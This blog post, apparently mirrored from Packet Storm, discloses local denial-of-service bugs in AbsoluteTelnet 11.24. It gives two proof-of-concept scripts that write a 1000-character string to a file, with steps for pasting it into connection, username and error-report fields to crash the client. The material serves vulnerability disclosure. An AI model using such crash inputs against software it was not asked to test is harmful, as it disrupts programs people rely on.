---
layout: post
title: AbsoluteTelnet 11.24
date: 2021-11-11 03:06 +0300
categories: [Exploits, Denial of Service (DoS)]
tags: [exploits]
---







![](../../../assets/img/Exploits/absolutetel.png)

Multiple denial-of-service vulnerabilities exist in AbsoluteTelnet version 11.24.

  

```
MD5 | c4916606f4a527de1d97ff6c1c0f4553
```


```perl
    # Exploit Title: AbsoluteTelnet 11.24 - 'Phone' Denial of Service (PoC)
    # Discovered by: Yehia Elghaly
    # Discovered Date: 2021-11-10
    # Vendor Homepage: https://www.celestialsoftware.net/
    # Software Link : https://www.celestialsoftware.net/telnet/AbsoluteTelnet32.11.24.exe
    # Tested Version: 11.24
    # Vulnerability Type: Denial of Service (DoS) Local
    # Tested on OS: Windows 7 Professional x86 SP1 - Windows 10 x64
    
    # Description: AbsoluteTelnet 11.24 - 'DialUp/Phone' & license name Denial of Service (PoC)
    
    # Steps to reproduce:
    # 1. - Download and install AbsoluteTelnet
    # 2. - Run the python script and it will create exploit.txt file.
    # 3. - Open AbsoluteTelnet 11.24
    # 4. - "new connection file -> DialUp Connection
    # 5. - Paste the characters of txt file to "DialUp  -> phone"
    # 6. - press "ok" button
    # 7. - Crashed
    # 8. - Reopen AbsoluteTelnet 11.24
    # 9. - Copy the same characters to "license name"
    # 10.- Click "Send Error Report" button
    # 11.- Crashed
    
    #!/usr/bin/python
    
    exploit = 'A' * 1000
    
    try:
        file = open("exploit.txt","w")
        file.write(exploit)
        file.close()
    
        print("POC is created")
    except:
        print("POC not created")
    
    
    ------
    
    # Exploit Title: AbsoluteTelnet 11.24 - 'Username' Denial of Service (PoC)
    # Discovered by: Yehia Elghaly
    # Discovered Date: 2021-11-10
    # Vendor Homepage: https://www.celestialsoftware.net/
    # Software Link: https://www.celestialsoftware.net/telnet/AbsoluteTelnet32.11.24.exe
    # Tested Version: 11.24
    # Vulnerability Type: Denial of Service (DoS) Local
    # Tested on OS: Windows 7 Professional x86 SP1 - Windows 10 x64
    
    # Description: AbsoluteTelnet 11.24 - 'SHA1/SHA2/Username' and 'Error Report' Denial of Service (PoC)
    
    # Steps to reproduce:
    # 1. - Download and install AbsoluteTelnet
    # 2. - Run the python script and it will create exploit.txt file.
    # 3. - Open AbsoluteTelnet 11.24
    # 4. - "new connection file -> Connection -> SSH1 & SSH2"
    # 5. - Paste the characters of txt file to "Authentication -> Username"
    # 6. - press "ok" button
    # 7. - Crashed
    # 8. - Reopen AbsoluteTelnet 11.24
    # 9. - Copy the same characters to "Your Email Address (optional)"
    # 10.- Click "Send Error Report" button
    # 11.- Crashed
    
    
    #!/usr/bin/python
    
    exploit = 'A' * 1000
    
    try:
        file = open("exploit.txt","w")
        file.write(exploit)
        file.close()
    
        print("POC is created")
    except:
        print("POC not created")
```
{: .nolineno }

<br> 

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)
